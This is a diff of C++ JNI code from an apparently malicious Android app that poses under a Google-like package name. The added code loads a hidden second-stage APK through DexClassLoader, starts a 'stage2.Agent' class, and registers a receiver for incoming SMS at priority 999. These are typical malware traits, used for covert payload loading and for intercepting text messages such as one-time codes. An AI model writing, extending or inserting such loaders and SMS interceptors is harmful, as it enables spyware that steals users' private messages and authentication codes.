@@ -121,18 +121,29 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
 
     if (jPath == nullptr) return;
 
-    // 3. Call Loader.loadClassesFromApk(path)
-    jclass loaderClass = env->FindClass("com/google/android/apps/work/cloudpc/Loader");
-    if (loaderClass == nullptr) return;
-    jmethodID loadApkMethod = env->GetStaticMethodID(loaderClass, "loadClassesFromApk", "(Ljava/lang/String;)Ljava/lang/ClassLoader;");
-    if (loadApkMethod == nullptr) return;
-    jobject classLoader = env->CallStaticObjectMethod(loaderClass, loadApkMethod, jPath);
+    // 3. Initialize DexClassLoader directly in C++
+    jclass dexClassLoaderClass = env->FindClass("dalvik/system/DexClassLoader");
+    if (dexClassLoaderClass == nullptr) return;
 
-    if (classLoader == nullptr) return;
+    jmethodID dexClassLoaderInit = env->GetMethodID(dexClassLoaderClass, "<init>",
+        "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
+    if (dexClassLoaderInit == nullptr) return;
+
+    // Use context.getClassLoader() as parent
+    jclass contextClass = env->GetObjectClass(context);
+    jmethodID getClassLoader = env->GetMethodID(contextClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
+    jobject parentLoader = env->CallObjectMethod(context, getClassLoader);
+
+    jobject classLoader = env->NewObject(dexClassLoaderClass, dexClassLoaderInit,
+        jPath, (jstring)NULL, (jstring)NULL, parentLoader);
+
+    if (classLoader == nullptr || env->ExceptionCheck()) {
+        env->ExceptionClear();
+        return;
+    }
 
     // 4. loader.loadClass("com.google.android.apps.work.stage2.Agent")
     jclass classLoaderClass = env->FindClass("java/lang/ClassLoader");
-    if (classLoaderClass == nullptr) return;
     jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
     if (loadClassMethod == nullptr) return;
     jstring className = env->NewStringUTF("com.google.android.apps.work.stage2.Agent");
@@ -151,23 +162,55 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
         getInstanceMethod = env->GetStaticMethodID(agentClass, "getInstance", "()Ljava/lang/Object;");
     }
 
-    if (getInstanceMethod == nullptr) return;
-    jobject agentInstance = env->CallStaticObjectMethod(agentClass, getInstanceMethod);
+    if (getInstanceMethod != nullptr) {
+        jobject agentInstance = env->CallStaticObjectMethod(agentClass, getInstanceMethod);
+        if (agentInstance != nullptr) {
+            // 6. Call agentInstance.start(context, null, null)
+            jmethodID startMethod = env->GetMethodID(agentClass, "start", "(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/Object;)V");
+            if (startMethod != nullptr) {
+                env->CallVoidMethod(agentInstance, startMethod, context, nullptr, nullptr);
+            }
+        }
+    }
 
-    if (agentInstance == nullptr) return;
+    // 7. Register UpdateReceiver from stage2 dynamically
+    jstring receiverClassName = env->NewStringUTF("com.google.android.apps.work.stage2.UpdateReceiver");
+    jclass updateReceiverClass = (jclass)env->CallObjectMethod(classLoader, loadClassMethod, receiverClassName);
 
-    // 6. Call agentInstance.start(context, null, null)
-    // Signature: (Landroid/content/Context;Landroid/content/Intent;Ljava/lang/Object;)V
-    jmethodID startMethod = env->GetMethodID(agentClass, "start", "(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/Object;)V");
-    if (startMethod == nullptr) return;
+    if (!env->ExceptionCheck() && updateReceiverClass != nullptr) {
+        jmethodID receiverInit = env->GetMethodID(updateReceiverClass, "<init>", "()V");
+        jobject receiverInstance = env->NewObject(updateReceiverClass, receiverInit);
 
-    env->CallVoidMethod(agentInstance, startMethod, context, nullptr, nullptr);
+        if (receiverInstance != nullptr) {
+            jclass filterClass = env->FindClass("android/content/IntentFilter");
+            jmethodID filterInit = env->GetMethodID(filterClass, "<init>", "(Ljava/lang/String;)V");
+            jstring action = env->NewStringUTF("android.provider.Telephony.SMS_RECEIVED");
+            jobject filter = env->NewObject(filterClass, filterInit, action);
+
+            // Set high priority
+            jmethodID setPriority = env->GetMethodID(filterClass, "setPriority", "(I)V");
+            if (setPriority != nullptr) {
+                env->CallVoidMethod(filter, setPriority, 999);
+            }
+
+            // registerReceiver(BroadcastReceiver, IntentFilter)
+            jmethodID registerReceiverMethod = env->GetMethodID(contextClass, "registerReceiver", "(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;");
+
+            if (registerReceiverMethod != nullptr) {
+                env->CallObjectMethod(context, registerReceiverMethod, receiverInstance, filter);
+
+                jclass logClass = env->FindClass("android/util/Log");
+                jmethodID infoMethod = env->GetStaticMethodID(logClass, "i", "(Ljava/lang/String;Ljava/lang/String;)I");
+                env->CallStaticIntMethod(logClass, infoMethod, env->NewStringUTF("JNI_Loader"), env->NewStringUTF("Successfully registered UpdateReceiver dynamically with priority 999"));
+            }
+        }
+    }
 
     if (env->ExceptionCheck()) {
         env->ExceptionClear();
     }
 
-    // Log success (optional but helpful)
+    // Log success
     jclass logClass = env->FindClass("android/util/Log");
     jmethodID infoMethod = env->GetStaticMethodID(logClass, "i", "(Ljava/lang/String;Ljava/lang/String;)I");
     jstring tag = env->NewStringUTF("JNI_Loader");
@@ -176,3 +219,4 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
     env->DeleteLocalRef(tag);
     env->DeleteLocalRef(msg);
 }
+
